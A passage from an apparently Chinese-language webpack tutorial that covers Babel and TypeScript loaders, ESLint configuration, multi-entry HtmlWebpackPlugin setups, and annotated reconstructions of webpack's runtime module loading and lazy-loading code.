\u0026#34;presets\u0026#34;: [[\u0026#34;@babel/preset-env\u0026#34;]], \u0026#34;plugins\u0026#34;: [ [ \u0026#34;@babel/plugin-transform-runtime\u0026#34;, { \u0026#34;corejs\u0026#34;: { \u0026#34;version\u0026#34;: 3 } } ] ] } polyfill-service polyfill.io自动化的 JavaScript Polyfill 服务 polyfill.io通过分析请求头信息中的 UserAgent 实现自动加载浏览器所需的 polyfills 1 \u0026lt;script src=\u0026#34;https://polyfill.io/v3/polyfill.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; TS 在 Webpack 中，ts-loader 和 babel-loader 都可以用来将 TypeScript 转换为 JavaScript，但它们的设计目标和工作方式不同，因此在实际使用中会有所区别。\nts-loader 是 Webpack 中的一个加载器，用于将 TypeScript 代码转换成 JavaScript 代码。它是基于 typescript 编译器实现的，支持所有 TypeScript 的语法和特性，可以帮助开发者在 Webpack 中使用 TypeScript 进行开发 直接使用 TypeScript 编译器 (tsc) 进行编译。 完全遵循 tsconfig.json 的配置，例如模块解析、类型检查等。 内置类型检查功能，能在编译过程中发现类型错误。 可能会导致构建速度变慢，尤其是在大项目中。 完全支持 TypeScript 的所有功能和特性。 如果项目依赖 TypeScript 的高级特性（如路径映射、声明文件生成等），ts-loader 更合适。 webpack.config.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 const path = require(\u0026#39;path\u0026#39;); module.exports = { + entry: \u0026#39;./src/index.ts\u0026#39;, module: { rules: [ + { + test: /\\.ts$/, + use: \u0026#39;ts-loader\u0026#39;, + exclude: /node_modules/ + }, ] }, }; @babel/preset-typescript 是 Babel 的一个预设，用于将 TypeScript 代码转换为 JavaScript 代码\n使用 Babel 进行转译，需要借助 @babel/preset-typescript 来支持 TypeScript 语法。\nBabel 只负责语法转换，不进行类型检查，需要额外运行 TypeScript 类型检查工具（例如 tsc --noEmit 或 fork-ts-checker-webpack-plugin）来捕捉类型错误。\n适合更高效的转译流程，尤其是在大型项目中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 { test: /\\.ts$/, use: + [ + { + loader: \u0026#39;babel-loader\u0026#39;, + options: { + presets: [\u0026#39;@babel/preset-typescript\u0026#39;] + } + } + ], exclude: /node_modules/ }, 选择 只用 TypeScript 的项目： 推荐使用 ts-loader，因为它完全遵循 TypeScript 的配置，且更适合处理 TypeScript 专属特性。 TypeScript + Babel 的项目： 推荐使用 babel-loader，并结合 Babel 的生态。如果需要类型检查，可以搭配 fork-ts-checker-webpack-plugin 或单独运行 tsc。 大型项目： 如果构建性能是关键因素，可以选择 babel-loader 进行快速语法转译，同时使用独立的类型检查流程（如 tsc --noEmit）。 最佳实践 如果需要在项目中结合两者的优势，可以这样配置：\n使用 babel-loader 转译 TypeScript 代码。 使用 fork-ts-checker-webpack-plugin 或 tsc --noEmit 进行类型检查。 例如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 const ForkTsCheckerWebpackPlugin = require(\u0026#34;fork-ts-checker-webpack-plugin\u0026#34;); module.exports = { module: { rules: [ { test: /\\.tsx?$/, use: \u0026#34;babel-loader\u0026#34;, exclude: /node_modules/, }, ], }, plugins: [new ForkTsCheckerWebpackPlugin()], resolve: { extensions: [\u0026#34;.tsx\u0026#34;, \u0026#34;.ts\u0026#34;, \u0026#34;.js\u0026#34;], }, }; 这样既能享受 Babel 的高性能和生态，又能确保 TypeScript 的类型安全。\neslint ESLint 是 JavaScript 代码检查工具，在编写代码时自动检查代码风格(这个一般交给 prettier 去做)和语法错误。为了满足不同团队和项目的代码规范需求，ESLint 生态中出现了许多基于不同代码规范的规则集合和插件 eslint-config-airbnb 是 Airbnb 提供的代码风格规则集。它的优点在于提供了一套完整的、可自定义的代码规范，旨在帮助开发者编写具有一致性和可读性的代码 eslint-config-standard遵循 Standard.js 代码风格规范，提供了最便捷的统一代码风格的方式。使用该规则集可以避免因代码风格不一致而引起的错误和混乱 eslint-plugin-vue和eslint-plugin-react插件来实现对 SFC 文件和 React 代码风格的检查 针对 TypeScript 代码的检查，可以使用@typescript-eslint/eslint-plugin插件来检查代码风格和语法错误 eslint-plugin-sonarjs插件，该插件基于Sonar提供了代码质量检查工具，提供圈复杂度、代码重复率等检测功能 旧版配置 1 npm install eslint eslint-loader babel-eslint --D 1 2 3 4 5 6 7 8 9 10 11 module: { rules: [ + { + test: /\\.jsx?$/, + loader: \u0026#39;eslint-loader\u0026#39;, + enforce: \u0026#39;pre\u0026#39;, // 值：不写 pre前置 post后置 确定针对同一个文件的规则匹配的优先级 + options: { fix: true }, + exclude: /node_modules/, + }, // 先检查代码风格，在进行编译 ] } .eslintrc.js：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 module.exports = { root: true, // 为true说明该文件是根配置文件，可以被其他配置文件继承规则，为true是就不能再写extends继承字段了 parser: \u0026#34;babel-eslint\u0026#34;, // 代码中有es6以后的写法，默认情况下可能不认识，需要使用babel-eslint识别新语法 //指定解析器选项 parserOptions: { sourceType: \u0026#34;module\u0026#34;, ecmaVersion: 2015, }, //指定脚本的运行环境 env: { browser: true, node: true, }, // 启用的规则及其各自的错误级别 rules: { indent: \u0026#34;off\u0026#34;, //缩进风格 quotes: \u0026#34;off\u0026#34;, //引号类型 \u0026#34;no-console\u0026#34;: \u0026#34;error\u0026#34;, //禁止使用console }, }; 1 npm i eslint-config-airbnb eslint-loader eslint eslint-plugin-import eslint-plugin-react eslint-plugin-react-hooks eslint-plugin-jsx-a11y -D 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 module.exports = { // 删除root文件，同时继承airbnb parser: \u0026#34;babel-eslint\u0026#34;, extends: \u0026#34;airbnb\u0026#34;, rules: { semi: \u0026#34;error\u0026#34;, \u0026#34;no-console\u0026#34;: \u0026#34;off\u0026#34;, \u0026#34;linebreak-style\u0026#34;: \u0026#34;off\u0026#34;, \u0026#34;eol-last\u0026#34;: \u0026#34;off\u0026#34;, //\u0026#34;indent\u0026#34;:[\u0026#34;error\u0026#34;,2] }, env: { browser: true, node: true, }, }; 新版配置 npm install eslint -D\nnpx eslint. \u0026ndash;init 问答式选择生产.eslintrc.js 文件，同时会安装一些配置预设和插件。\n以前通过配置 loader 实现在编译阶段对源代码规范的校验并在不规范的情况下报错。\n现在则改为插件的形式。同时原来的解析器 babel-eslint 已经停止维护了，现在使用@babel/eslint-parser。\n1 2 3 4 5 6 7 8 9 // webpack.config.js const ESLintPlugin = require(\u0026#34;eslint-webpack-plugin\u0026#34;); plugins: [ new ESLintPlugin({ fix: true, }), ]; .eslintrc.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 module.exports = { env: { browser: true, es2021: true, node: true, }, parser: \u0026#34;@babel/eslint-parser\u0026#34;, // 不用这个解析器则是用eslint默认的 extends: [\u0026#34;plugin:react/recommended\u0026#34;, \u0026#34;airbnb\u0026#34;], overrides: [], parserOptions: { ecmaVersion: \u0026#34;latest\u0026#34;, sourceType: \u0026#34;module\u0026#34;, }, plugins: [\u0026#34;react\u0026#34;], rules: { \u0026#34;no-unused-vars\u0026#34;: \u0026#34;error\u0026#34;, \u0026#34;no-undef\u0026#34;: \u0026#34;error\u0026#34;, }, }; MAP 项目配置 在 Webpack 中，当项目有多个模板 HTML 文件且每个模板 HTML 都对应一个入口模块时，需要使用多入口配置来构建。以下是典型的 Webpack 配置文件示例，适用于这样的场景：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 const path = require(\u0026#34;path\u0026#34;); const HtmlWebpackPlugin = require(\u0026#34;html-webpack-plugin\u0026#34;); const entries = { index: \u0026#34;./src/index.js\u0026#34;, about: \u0026#34;./src/about.js\u0026#34;, contact: \u0026#34;./src/contact.js\u0026#34;, }; module.exports = { entry: entries, output: { path: path.resolve(__dirname, \u0026#34;dist\u0026#34;), filename: \u0026#34;[name].bundle.js\u0026#34;, // 输出的文件名对应入口名称 clean: true, // 清理旧文件 }, module: { rules: [ { test: /\\.js$/, exclude: /node_modules/, use: \u0026#34;babel-loader\u0026#34;, }, { test: /\\.css$/, use: [\u0026#34;style-loader\u0026#34;, \u0026#34;css-loader\u0026#34;], }, { test: /\\.(png|jpg|jpeg|gif|svg)$/, type: \u0026#34;asset/resource\u0026#34;, }, ], }, plugins: [ ...Object.keys(entries).map( (entryName) =\u0026gt; new HtmlWebpackPlugin({ filename: `${entryName}.html`, // 生成的 HTML 文件名 template: `./src/templates/${entryName}.html`, // 模板路径 chunks: [entryName], // 指定入口文件 chunks 用于指定当前模板使用的入口模块，防止加载不相关的 JS 文件。 }) ), ], optimization: { splitChunks: { chunks: \u0026#34;all\u0026#34;, // 提取公共模块 配置 optimization.splitChunks 提取公共模块（如第三方库），减少重复代码。 }, }, devServer: { static: path.resolve(__dirname, \u0026#34;dist\u0026#34;), open: true, port: 8080, }, }; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 project/ ├── src/ │ ├── index.js │ ├── about.js │ ├── contact.js │ ├── templates/ │ │ ├── index.html │ │ ├── about.html │ │ └── contact.html │ ├── styles/ │ │ ├── index.css │ │ ├── about.css │ │ └── contact.css ├── dist/ ├── webpack.config.js ├── package.json HtmlWebpackPlugin 插件中的 chunks 选项的作用是指定当前生成的 HTML 文件中需要引入的 JavaScript 模块（即 Webpack 中的入口文件）。它提供了精确的控制，确保只包含与当前 HTML 文件相关的脚本，从而避免加载多余的文件。\nchunks 选项的主要功能 指定引入的脚本: 当项目使用多入口配置时，每个入口文件可能会生成不同的 JavaScript 文件。通过 chunks 指定关联的入口文件，可以确保 HTML 文件只引入相关的 JS 文件。 优化加载性能: 通过只加载所需的模块，减少不必要的脚本加载，提升页面性能。 避免冲突: 当每个页面使用不同的模块时，避免引入错误或不需要的代码导致的冲突或错误。 chunks 的使用场景 1. 多入口配置 在多页面应用中，不同的 HTML 文件对应不同的入口模块。例如：\nindex.html 对应 index.js about.html 对应 about.js contact.html 对应 contact.js 配置示例:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 const HtmlWebpackPlugin = require(\u0026#34;html-webpack-plugin\u0026#34;); module.exports = { entry: { index: \u0026#34;./src/index.js\u0026#34;, about: \u0026#34;./src/about.js\u0026#34;, contact: \u0026#34;./src/contact.js\u0026#34;, }, plugins: [ new HtmlWebpackPlugin({ filename: \u0026#34;index.html\u0026#34;, template: \u0026#34;./src/templates/index.html\u0026#34;, chunks: [\u0026#34;index\u0026#34;], // 仅引入 index.js }), new HtmlWebpackPlugin({ filename: \u0026#34;about.html\u0026#34;, template: \u0026#34;./src/templates/about.html\u0026#34;, chunks: [\u0026#34;about\u0026#34;], // 仅引入 about.js }), new HtmlWebpackPlugin({ filename: \u0026#34;contact.html\u0026#34;, template: \u0026#34;./src/templates/contact.html\u0026#34;, chunks: [\u0026#34;contact\u0026#34;], // 仅引入 contact.js }), ], }; 2. 引入多个入口文件 有时一个页面需要引入多个入口文件，可以在 chunks 中同时指定：\n配置示例:\n1 2 3 4 5 new HtmlWebpackPlugin({ filename: \u0026#34;dashboard.html\u0026#34;, template: \u0026#34;./src/templates/dashboard.html\u0026#34;, chunks: [\u0026#34;index\u0026#34;, \u0026#34;about\u0026#34;], // 同时引入 index.js 和 about.js }); 不使用 chunks 会发生什么？ 如果不设置 chunks，HtmlWebpackPlugin 会默认引入所有的入口模块（即 entry 中的所有文件）。这可能导致以下问题：\n加载多余脚本: 所有的入口文件都会被加载，可能包含不相关的代码，浪费资源。 潜在的冲突: 不同页面的脚本可能相互影响（如全局变量冲突）。 对比 chunks 和 excludeChunks chunks: 指定要包含的入口模块。 excludeChunks: 指定要排除的入口模块。 示例:\n1 2 3 4 5 6 7 8 9 10 11 // 只引入指定模块 new HtmlWebpackPlugin({ filename: \u0026#34;index.html\u0026#34;, chunks: [\u0026#34;index\u0026#34;], // 仅引入 index.js }); // 排除指定模块 new HtmlWebpackPlugin({ filename: \u0026#34;index.html\u0026#34;, excludeChunks: [\u0026#34;about\u0026#34;, \u0026#34;contact\u0026#34;], // 排除 about.js 和 contact.js }); 总结 chunks 的作用是为每个生成的 HTML 文件精确指定需要加载的入口模块，避免引入不必要的脚本文件，提升加载性能和代码管理效率。合理使用 chunks 可以确保 Webpack 配置更灵活、更高效。\nwebpack 原理预备知识 Symbol.toStringTag 是一个内置 symbol，它通常作为对象的属性使用，对应的属性值应该为字符串类型，这个字符串用来表示该对象的自定义类型标签 通常只有内置的 Object.prototype.toString() 方法会去读取这个标签并把它包含在自己的返回值里。 1 2 3 4 5 6 7 8 9 10 console.log(Object.prototype.toString.call(\u0026#34;foo\u0026#34;)); // \u0026#34;[object String]\u0026#34; console.log(Object.prototype.toString.call([1, 2])); // \u0026#34;[object Array]\u0026#34; console.log(Object.prototype.toString.call(3)); // \u0026#34;[object Number]\u0026#34; console.log(Object.prototype.toString.call(true)); // \u0026#34;[object Boolean]\u0026#34; console.log(Object.prototype.toString.call(undefined)); // \u0026#34;[object Undefined]\u0026#34; console.log(Object.prototype.toString.call(null)); // \u0026#34;[object Null]\u0026#34; let myExports = {}; Object.defineProperty(myExports, Symbol.toStringTag, { value: \u0026#34;Module\u0026#34; }); console.log(Object.prototype.toString.call(myExports)); //[object Module] 自定义某个数据的标识 webpack.config.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 const path = require(\u0026#39;path\u0026#39;); const HtmlWebpackPlugin = require(\u0026#39;html-webpack-plugin\u0026#39;); module.exports = { mode: \u0026#39;development\u0026#39;, devtool: false, entry: \u0026#39;./src/index.js\u0026#39;, output: { path: path.resolve(__dirname, \u0026#39;dist\u0026#39;), filename: \u0026#39;main.js\u0026#39;， clean:true }, plugins: [ new HtmlWebpackPlugin({ template: \u0026#39;./src/index.html\u0026#39;, filename: \u0026#39;index.html\u0026#39; }) ], }; 入口文件 index.js\n1 2 let title = require(\u0026#34;./title.js\u0026#34;); console.log(title); title.js:\n1 module.exports = \u0026#34;title\u0026#34;; 打包后生成文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // modules存放项目中除了入口模块之外依赖的所有模块（依赖关系图的生成结果）， key（模块id）是模块对于项目的所在根目录的相对路径，值是函数，函数体内容由模块文件的内容组成 var modules = { //不管源码中是模块路径，相对或绝对路径，最后都转为相对于项目根目录的相对路径 \u0026#39;./src/title.js\u0026#39;: (module, exports, require) =\u0026gt; { module.exports = \u0026#39;title\u0026#39;; } }; // 缓存已经被引入过的模块 var cache = {}; // require方法，相当于webpack在浏览器端实现一个require的polyfull的方法 function require(moduleId) { if (cache[moduleId]) { return cache[moduleId].exports; } var module = cache[moduleId] = { id: moduleId, loaded: false, exports: {} }z; modules[moduleId](module, module.exports, require); return module.exports; } var exports = {}; let title = require(\u0026#39;./src/title.js\u0026#39;); // 可以看出整个代码是同步执行的 console.log(title); 当 index.js 中引入两个依赖文件 test1.js 和 test2.js 时的打包结果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 var webpackModules = { \u0026#34;./src/test/test1.js\u0026#34;: (module, unusedWebpackExports, webpackRequire) =\u0026gt; { module = webpackRequire.nmd(module); module.export = \u0026#34;test1\u0026#34;; }, \u0026#34;./src/test/test2.js\u0026#34;: (module, unusedWebpackExports, webpackRequire) =\u0026gt; { module = webpackRequire.nmd(module); module.export = \u0026#34;test2\u0026#34;; }, }; var webpackModuleCache = {}; function webpackRequire(moduleId) { var cachedModule = webpackModuleCache[moduleId]; if (cachedModule !== undefined) { return cachedModule.exports; } var module = (webpackModuleCache[moduleId] = { id: moduleId, loaded: false, exports: {}, }); webpackModules[moduleId](module, module.exports, webpackRequire); module.loaded = true; return module.exports; } webpackRequire.nmd = (module) =\u0026gt; { module.paths = []; if (!module.children) module.children = []; return module; }; var webpackExports = {}; const test1 = webpackRequire(\u0026#34;./src/test/test1.js\u0026#34;); const test2 = webpackRequire(\u0026#34;./src/test/test2.js\u0026#34;); console.log(test1); console.log(test2); 在 webpack 中有两种模块化规范，commonjs 和 esmodule，他们之间可以相会转换和混用。并且在 webpack 打包后都统一使用 commonJS 模块规范。\ncommon.js 加载 common.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // index.js: let title = require(\u0026#34;./title\u0026#34;); console.log(title.name); console.log(title.age); // title.js exports.name = \u0026#34;title_name\u0026#34;; exports.age = \u0026#34;title_age\u0026#34;; // 打包结果 var modules = { // 定义了一个对象，将每一个加载的模块以及模块对应的代码，添加到该函数内部，然后该函数作为值，而模块的路径对应key。 在commonjs中并没有将入口文件加入到__webpack_modules__对象内部作为一个属性。而在ES6的中是做了。可以看下面的ES6打包文件 \u0026#34;./src/title.js\u0026#34;: (module, exports) =\u0026gt; { exports.name = \u0026#34;title_name\u0026#34;; exports.age = \u0026#34;title_age\u0026#34;; }, }; var cache = {}; // 一旦整个项目中有一个文件引入了一个模块后，后续该项目中的其他文件再引入相同的文件，则实际上都是同一个导出。 function require(moduleId) { var cachedModule = cache[moduleId]; if (cachedModule !== undefined) { return cachedModule.exports; } var module = (cache[moduleId] = { exports: {}, }); modules[moduleId](module, module.exports, require); return module.exports; } var exports = {}; let title = require(\u0026#34;./src/title.js\u0026#34;); console.log(title.name); console.log(title.age); common.js 加载 ES6 modules 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 // index.js: let title = require(\u0026#39;./title\u0026#39;); console.log(title.default); console.log(title.age); // title.js export default \u0026#39;title_name\u0026#39;; // 默认导出 export const age = \u0026#39;title_age\u0026#39;; // 命名导出 // 打包结果 (() =\u0026gt; { // 模块定义 var modules = { \u0026#39;./src/title.js\u0026#39;: (module, exports, require) =\u0026gt; { // es module转commonjs const _DEFAULT_EXPORT__ = \u0026#39;title_name\u0026#39;; // 注意这里是const定义的变量，所以在导入该模块的文件中是无法修改该变量的值的 const age = \u0026#39;title_age\u0026#39;; require.r(exports); // r函数用于标识exports是一个es module的导出 require.d(exports, { default: () =\u0026gt; _DEFAULT_EXPORT__, age: () =\u0026gt; age // 从这里可以看出esmodule的导出，导出的是变量本身，这不同于commonjs导出的是值或者对象引用，而且在定义时，并没有提供对应属性的setter方法，所以导入该模块的其他模块是无法修改该导出变量的值的。 而且该模块中在后续修改了该变量对应的值后，其他模块再次访问导出的变量时，会是最新的值。 }); } }; var cache = {}; function require(moduleId) { var cachedModule = cache[moduleId]; if (cachedModule !== undefined) { return cachedModule.exports; } var module = (cache[moduleId] = { exports: {} }); modules[moduleId](module, module.exports, require); return module.exports; } // 给对象定义属性 require.d = (exports, definition) =\u0026gt; { for (var key in definition) { if (require.o(definition, key) \u0026amp;\u0026amp; !require.o(exports, key)) { Object.defineProperty(exports, key, { enumerable: true, get: definition[key] // 只定义了getter } } }; require.o = (obj, prop) =\u0026gt; Object.prototype.hasOwnProperty.call(obj, prop); // r函数用于标识exports是一个es module的导出 require.r = (exports) =\u0026gt; { // 宿主环境支持symbol数据类型 if (typeof Symbol !== \u0026#39;undefined\u0026#39; \u0026amp;\u0026amp; Symbol.toStringTag) { Object.defineProperty(exports, Symbol.toStringTag, { value: \u0026#39;Module\u0026#39; }); // [object Module] } // 宿主环境不支持symbol数据类型时 Object.defineProperty(exports, \u0026#39;__esModule\u0026#39;, { value: true }); // exports.__esModule = true，通过该属性就能知道该模块文件是采用的commonJS模块还是esModule模块规范 }; let title = require(\u0026#39;./src/title.js\u0026#39;); // title默认是引入的那个模块 console.log(title.default); // es6中默认导出在commonjs中是通过default属性获取的。 console.log(title.age); })(); ES6 modules 加载 ES6 modules 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 // index.js import name, { age } from \u0026#34;./title\u0026#34;; console.log(name); console.log(age); // title.js export default \u0026#34;title_name\u0026#34;; export const age = \u0026#34;title_age\u0026#34;; // 打包结果 var modules = { \u0026#34;./src/title.js\u0026#34;: (module, exports, require) =\u0026gt; { require.r(exports); let _DEFAULT_EXPORT__ = \u0026#34;title_name\u0026#34;; let age = \u0026#34;title_age\u0026#34;; setTimeout(() =\u0026gt; { age = \u0026#34;new\u0026#34;; }, 1000); require.d(exports, { default: () =\u0026gt; _DEFAULT_EXPORT__, age: () =\u0026gt; age, }); }, }; var cache = {}; function require(moduleId) { var cachedModule = cache[moduleId]; if (cachedModule !== undefined) { return cachedModule.exports; } var module = (cache[moduleId] = { exports: {}, }); modules[moduleId](module, module.exports, require); return module.exports; } require.d = (exports, definition) =\u0026gt; { for (var key in definition) { if (require.o(definition, key) \u0026amp;\u0026amp; !require.o(exports, key)) { Object.defineProperty(exports, key, { enumerable: true, get: definition[key], }); } } }; require.o = (obj, prop) =\u0026gt; Object.prototype.hasOwnProperty.call(obj, prop); require.r = (exports) =\u0026gt; { if (typeof Symbol !== \u0026#34;undefined\u0026#34; \u0026amp;\u0026amp; Symbol.toStringTag) { Object.defineProperty(exports, Symbol.toStringTag, { value: \u0026#34;Module\u0026#34; }); } Object.defineProperty(exports, \u0026#34;__esModule\u0026#34;, { value: true }); }; var exports = {}; require.r(exports); var _title_0__ = require(\u0026#34;./src/title.js\u0026#34;); console.log(_title_0__[\u0026#34;default\u0026#34;]); console.log(_title_0__.age); ES6 modules 加载 common.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 // index.js import name, { age } from \u0026#34;./title\u0026#34;; console.log(name); // 这里的默认导入实际上就是被导入的commonjs模块的module.exports对象 console.log(age); // title.js module.exports = { name: \u0026#34;title_name\u0026#34;, age: \u0026#34;title_age\u0026#34;, }; // 打包结果 (() =\u0026gt; { var modules = { \u0026#34;./src/title.js\u0026#34;: (module) =\u0026gt; { module.exports = { name: \u0026#34;title_name\u0026#34;, age: \u0026#34;title_age\u0026#34;, }; }, }; var cache = {}; function require(moduleId) { var cachedModule = cache[moduleId]; if (cachedModule !== undefined) { return cachedModule.exports; } var module = (cache[moduleId] = { exports: {}, }); modules[moduleId](module, module.exports, require); return module.exports; } require.n = (module) =\u0026gt; { var getter = module \u0026amp;\u0026amp; module.__esModule ? () =\u0026gt; module[\u0026#34;default\u0026#34;] : () =\u0026gt; module; require.d(getter, { a: getter }); //给getter添加一个a属性，a的值就是getter的返回值 getter.a return getter; }; require.d = (exports, definition) =\u0026gt; { for (var key in definition) { if (require.o(definition, key) \u0026amp;\u0026amp; !require.o(exports, key)) { Object.defineProperty(exports, key, { enumerable: true, get: definition[key], }); } } }; require.o = (obj, prop) =\u0026gt; Object.prototype.hasOwnProperty.call(obj, prop); require.r = (exports) =\u0026gt; { Object.defineProperty(exports, Symbol.toStringTag, { value: \u0026#34;Module\u0026#34; }); Object.defineProperty(exports, \u0026#34;__esModule\u0026#34;, { value: true }); }; var exports = {}; (() =\u0026gt; { //只要打包前的模块是一个es module,那么就会调用require.r方法进行标识 require.r(exports); var _title_0__ = require(\u0026#34;./src/title.js\u0026#34;); var _title_0___default = require.n(_title_0__); console.log(_title_0___default()); console.log(_title_0__.age); })(); })(); 在 a 模块中使用 commonjs 的 require 语法加载 b 模块，b 模块使用 ES Module 进行默认导出和命名导出，则在 a 模块中得到的是 b 模块对应的模块对象，其中包含命名导出和 default 默认导出属性。\n1 2 3 4 5 6 7 8 // index.js: let title = require(\u0026#34;./title\u0026#34;); console.log(title); // title是title.js模块对象 console.log(title.age); // title.js export default \u0026#34;title_name\u0026#34;; // 默认导出 export const age = \u0026#34;title_age\u0026#34;; // 命名导出 面试：commonjs 和 es Module 导出的区别？\ncommonjs 是在导入模块中是值和引用 es module 是在导入模块中是对导出模块导出对象或者值的内存引用 1 2 3 4 5 6 7 8 9 10 11 12 // index.js import title, { age } from \u0026#34;./title.js\u0026#34;; setTimeout(() =\u0026gt; { console.log(age); // 打印 20 }, 3000); // title.js export var age = 10; export default {}; setTimeout(() =\u0026gt; { age = 20; }, 1000); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // index.js let title = require(\u0026#34;./title.js\u0026#34;); setTimeout(() =\u0026gt; { console.log(title.age); // 打印 10 console.log(title.obj.name); // 456 }, 3000); // title.js var age = 10; var obj = { name: 123, }; module.exports = { age, obj, }; setTimeout(() =\u0026gt; { age = 20; obj.name = 456; }, 1000); 异步加载 懒加载和代码分割，原生的代码分割点，可以分割模块为一个个单独的文件一个个加载。\n1 2 3 4 5 6 7 // index.js import返回的结果是一个promise实例，返回的结果不管源文件是commonjs还是esmodule，都包装为esmodule import(/* webpackChunkName: \u0026#34;hello\u0026#34; */ \u0026#34;./hello.js\u0026#34;).then((result) =\u0026gt; { console.log(result.default); }); // hello.js export default \u0026#34;hello\u0026#34;; 打包后，用户访问打包后的 html 文件，该文件引入了整个项目的启动 js 文件（build.js 或者 main.js）,不会加载拆包后没有用到的 js 文件。当在浏览器中执行启动 js 文件时，该文件会将用到的 js 文件通过创建 script 标签的形式去加载拆包的 js 文件，请求回来的 js 文件一解析执行就会触发已经在前端被定义好的方法——webpackJsonpCallback，这个方法会将请求回来 js 的文件依次内容挂载到 modules，同时执行相应文件之前准备的 promise 的 resolve 方法。当所有文件都加载完成且 promise 的 resolve 方法都成功调用后，将触发 Promise.all，然后在 promise.all 的 then 方法中依次触发 require 方法，加载并执行已经挂载到 modules 上的请求回来的 js 文件内容。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 debugger; var modules = {}; // 模块定义存放在这个对象中 var cache = {}; function require(moduleId) { var cachedModule = cache[moduleId]; if (cachedModule !== undefined) { return cachedModule.exports; } var module = (cache[moduleId] = { exports: {}, }); modules[moduleId](module, module.exports, require); return module.exports; } require.d = (exports, definition) =\u0026gt; { for (var key in definition) { if (require.o(definition, key) \u0026amp;\u0026amp; !require.o(exports, key)) { Object.defineProperty(exports, key, { enumerable: true, get: definition[key], }); } } }; require.o = (obj, prop) =\u0026gt; Object.prototype.hasOwnProperty.call(obj, prop); require.r = (exports) =\u0026gt; { if (typeof Symbol !== \u0026#34;undefined\u0026#34; \u0026amp;\u0026amp; Symbol.toStringTag) { Object.defineProperty(exports, Symbol.toStringTag, { value: \u0026#34;Module\u0026#34;, }); } Object.defineProperty(exports, \u0026#34;__esModule\u0026#34;, { value: true, }); }; function webpackJsonpCallback([chunkIds, moreModules]) { const resolves = []; for (let i = 0; i \u0026lt; chunkIds.length; i++) { const chunkId = chunkIds[i]; resolves.push(installedChunks[chunkId][0]); installedChunks[chunkId] = 0; } for (const moduleId in moreModules) { modules[moduleId] = moreModules[moduleId]; } //依次取出promise的resolve方法，让它对应的promise变成成功态 while (resolves.length) { resolves.shift()(); } } //已经安装过的，或者说已经加载好的代码块 //key是代码块的名字，值是代码块的状态 //main就是默认代码块的名称 0表示已经加载完成 var installedChunks = { main: 0, //当一个代码块它的值是一个数组的时候表示此代码块对应的JS文件正在加载中 //\u0026#39;src_hello_js\u0026#39;:[resolve,reject,promise]=\u0026gt;0 }; require.f = {}; require.p = \u0026#34;\u0026#34;; // 这个值取的是webpack文件中output配置项中的publicPath的值。 require.u = (chunkId) =\u0026gt; chunkId + \u0026#34;.js\u0026#34;; require.l = (url) =\u0026gt; { let script = document.createElement(\u0026#34;script\u0026#34;); script.src = url; document.head.appendChild(script); script.onload = () =\u0026gt; { script.remove(); }; }; //jsonp 通过JSONP的方式加载chunkId对应的JS文件，生成一个promise放到promises数组里 require.f.j = (chunkId, promises) =\u0026gt; { let installedChunkData = installedChunks[chunkId]; if (installedChunkData === 0) { return; } const promise = new Promise((resolve, reject) =\u0026gt; { installedChunkData = installedChunks[chunkId] = [resolve, reject]; }); installedChunkData[2] = promise; //installedChunkData=[resolve,reject,promise] promises.push(promise); const url = require.p + require.u(chunkId); require.l(url); }; require.e = (chunkId) =\u0026gt; { let promises = []; require.f.j(chunkId, promises); return Promise.all(promises); }; const chunkLoadingGlobal = (window[\u0026#34;webpackChunk_2_bundle\u0026#34;] = []); chunkLoadingGlobal.push = webpackJsonpCallback; require .e(\u0026#34;src_hello_js\u0026#34;) .then(require.bind(require, \u0026#34;./src/hello.js\u0026#34;)) .then((result) =\u0026gt; { console.log(result.default); }); //代码块其实就模块的集合 src_hello_js.js：\n1 2 3 4 5 6 7 8 9 10 11 12 (self[\u0026#34;webpackChunk_2_bundle\u0026#34;] = self[\u0026#34;webpackChunk_2_bundle\u0026#34;] || []).push([ [\u0026#34;src_hello_js\u0026#34;], { \u0026#34;./src/hello.js\u0026#34;: (module, exports, require) 